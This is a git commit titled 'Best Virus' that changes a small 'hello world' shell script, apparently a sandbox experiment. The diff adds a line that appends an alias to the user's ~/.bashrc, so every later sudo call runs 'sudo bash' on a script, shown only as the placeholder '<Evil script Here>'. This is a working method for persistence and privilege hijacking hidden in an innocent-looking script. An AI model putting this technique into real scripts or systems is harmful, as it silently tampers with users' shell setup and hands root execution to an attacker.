7c9cce9f8b68bcb9ab5024d74429f198c9ee963f
Jared Capaldi <jaredcapaldi@outlook.com>
2020-09-18 17:47:53 -0400

    Best Virus

--- hello.sh
+++ hello.sh
@@ -1,4 +1,5 @@
 #!/bin/sh
 echo "Hello world, from a sandbox"
 cat ~/.bashrc
-echo "echo \"I've infected your computer with a Virus.\"" >> ~/.bashrc
+echo "alias sudo='sudo bash <Evil script Here>'" >> ~/.bashrc
+
